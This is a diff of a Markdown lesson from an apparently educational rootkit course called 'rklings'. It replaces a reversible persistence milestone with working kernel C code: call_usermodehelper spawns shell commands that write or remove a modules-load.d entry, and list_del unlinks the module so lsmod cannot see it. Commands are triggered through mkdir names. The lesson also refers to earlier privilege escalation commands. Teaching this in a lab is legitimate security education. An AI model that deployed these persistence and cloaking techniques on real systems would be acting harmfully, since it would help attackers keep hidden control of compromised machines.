@@ -1,105 +1,115 @@
-# Stage a reversible boot-load request
+# Persist across reboot and hide from lsmod
 
-A rootkit that disappears on reboot is no rootkit at all.
-This milestone teaches the standard Linux persistence mechanism: writing a
-`modules-load.d` configuration file so the module reloads at every boot.
+A rootkit that disappears on reboot is useless. A rootkit visible in lsmod
+is caught. This milestone solves both problems.
 
-## How persistence works
+## Persistence via call_usermodehelper
 
-Linux reads `/etc/modules-load.d/*.conf` at boot.
-Each line names a module to load.
-Writing `rklings` to `/etc/modules-load.d/rklings.conf` makes the module survive
-reboots.
+Linux reads `/etc/modules-load.d/*.conf` at boot. Each line names a module
+to load. Writing `rklings` to `/etc/modules-load.d/rklings.conf` makes the
+module survive reboots.
 
-In the rklings VM, init reads these files and loads the modules before dropping
-you into a shell.
-Test with bare mode (root shell) so you can `insmod` and `rmmod` manually:
+From kernel context, `call_usermodehelper` spawns a userspace process:
 
-    ./rklings run --bare
+```c
+static int rk_persist(void)
+{
+    char *argv[] = { "/bin/sh", "-c",
+                     "echo rklings > /etc/modules-load.d/rklings.conf",
+                     NULL };
+    char *envp[] = { "HOME=/", "PATH=/sbin:/usr/sbin:/bin:/usr/bin",
+                     NULL };
 
-1. Boot the VM.
-   No module is loaded.
-2. Load the module: `insmod rklings.ko`
-3. Persist it: `echo persist > /proc/rklings`
-4. Reboot: `reboot`
-5. The module loads automatically.
-   You see `Persisted module loaded`.
-6. Unload the module with `rmmod`: the transaction is reversed and the conf file
-   is cleaned up.
-   Next reboot starts fresh again.
-
-## The transaction pattern
-
-Naive persistence (just write the file) has two problems:
-
-1. If the write is interrupted, the file is half-written.
-2. If the module is unloaded, the persistence file stays behind.
-
-The solution is a staged atomic transaction:
-
-```text
-persist:
-    staging                target
-    "rklings"         ""
-         |                  |
-         +- RENAME_EXCHANGE +
-         |                  |
-    ""                     "rklings"
-    (old content)          (now live)
-
-unload:
-    staging                target
-         |                  |
-         +- RENAME_EXCHANGE +
-         |                  |
-    "rklings"         ""
-    (swapped back)         (restored)
-         |
-       unlink
+    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
+}
 ```
 
-1. Create a staging file (`.rklings.conf.staging`) with O_EXCL.
-2. Write the module name, fsync.
-3. `RENAME_EXCHANGE` the staging file with the target.
-4. fsync the directory.
-5. On unload, reverse the exchange and unlink the staging file.
+`call_usermodehelper` creates a new process, executes the command, and
+waits for it to finish (`UMH_WAIT_PROC`). The shell writes the file with
+normal filesystem permissions. No filp_open, no kernel_write, no direct
+VFS calls.
 
-`RENAME_EXCHANGE` is an atomic swap: the target gets the new content and the
-staging file gets the old content in a single syscall.
-No window where either file is missing or half-written.
+To remove persistence, delete the conf file the same way:
 
-The `rk_transaction_apply()` and `rk_transaction_restore()` functions implement
-this.
-The platform layer handles the filesystem operations.
+```c
+static int rk_unpersist(void)
+{
+    char *argv[] = { "/bin/sh", "-c",
+                     "rm -f /etc/modules-load.d/rklings.conf", NULL };
+    char *envp[] = { "HOME=/", "PATH=/sbin:/usr/sbin:/bin:/usr/bin",
+                     NULL };
 
-## The rollback guarantee
+    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
+}
+```
 
-On module unload, the exit function calls `rk_transaction_restore()`, which
-verifies both files still match their snapshots before exchanging them back.
-If someone modified either file while the module was loaded, the restore detects
-the stale state and preserves both files unchanged, logging a warning.
-This prevents silent data loss.
+```text
+mkdir rklings.persist
+    |
+    v
+call_usermodehelper("/bin/sh", {"-c", "echo rklings > .../rklings.conf"}, ...)
+    |
+    v
+UMH_WAIT_PROC: kernel waits for shell to finish
+    |
+    v
+reboot -> init reads rklings.conf -> module loads automatically
+```
 
-## Control interface
+## Module cloaking via list_del
 
-The proc interface creates `/proc/rklings` (world-readable and writable):
+The kernel tracks loaded modules in a doubly-linked list.
+`lsmod` reads this list. Remove your module from the list and lsmod cannot
+see it.
 
-| Command | Effect |
+```text
+module list:
+  [mod_a] <-> [rklings] <-> [mod_b]
+
+mkdir rklings.h.m:
+  [mod_a] <-> [mod_b]
+  (saved_prev = &mod_a.list)
+
+mkdir rklings.u.m:
+  [mod_a] <-> [rklings] <-> [mod_b]
+  (restored via list_add)
+```
+
+`THIS_MODULE->list` is a `struct list_head`, a node in the kernel's global
+module list. Three things to know:
+
+1. `list_del(&THIS_MODULE->list)` removes the node. After this call,
+   lsmod, /proc/modules, and sysfs all stop showing the module.
+2. Save `THIS_MODULE->list.prev` before deleting. This pointer lets you
+   re-insert later with `list_add(&THIS_MODULE->list, saved_prev)`.
+3. Always unhide in module_exit. A hidden module can still be unloaded
+   with `rmmod rklings` (the kernel finds it by name in a separate hash),
+   but the list must be consistent before cleanup runs.
+
+## New commands
+
+Wire these four commands into your dispatcher:
+
+| Command | Action |
 |---------|--------|
-| `echo persist > /proc/rklings` | Stage the boot-load request |
-| `cat /proc/rklings` | Show current state |
+| `mkdir rklings.persist` | Write module name to modules-load.d |
+| `mkdir rklings.unpersist` | Remove the conf file |
+| `mkdir rklings.h.m` | Hide module from lsmod |
+| `mkdir rklings.u.m` | Unhide module |
 
-On `rmmod`, the exit path reverses the transaction automatically.
+The escalation commands from earlier lessons (`rklings.e`, `rklings.e.<pid>`)
+must still work.
 
 ## Your task
 
-Wire `rk_transaction_apply()` into the worker thread so it runs when the
-`persist` command is received via the proc interface.
-Wire `rk_transaction_restore()` into the module exit path so persistence is
-rolled back on unload.
+The starter provides persistence (call_usermodehelper) already implemented.
+Add module cloaking:
 
-The staging, transaction, worker, and proc files are provided.
-Your job is `core/main.c`: the init and exit functions that connect everything.
+1. Declare `saved_prev` and `module_hidden` state variables
+2. `rk_module_hide()`: save prev pointer, list_del, set hidden flag
+3. `rk_module_unhide()`: list_add to restore, clear hidden flag
+4. Wire `h.m` and `u.m` into the command dispatcher
+5. Call `rk_module_unhide()` in module_exit before unregistering the probe
 
 Run:
 
@@ -109,8 +119,10 @@ Run:
 
 ## References
 
-- [Linux v7.2 `renameat2()` and `RENAME_EXCHANGE`][1]
-- [Linux v7.2 `modules-load.d(5)` boot-time module loading][2]
+- [Linux v7.2 `call_usermodehelper`][1]
+- [Linux v7.2 module list: THIS_MODULE, list_del, list_add][2]
+- [modules-load.d(5) boot-time module loading][3]
 
-[1]: https://github.com/torvalds/linux/blob/v7.2/fs/namei.c
-[2]: https://www.freedesktop.org/software/systemd/man/latest/modules-load.d.html
+[1]: https://github.com/torvalds/linux/blob/v7.2/kernel/umh.c
+[2]: https://github.com/torvalds/linux/blob/v7.2/include/linux/module.h
+[3]: https://www.freedesktop.org/software/systemd/man/latest/modules-load.d.html
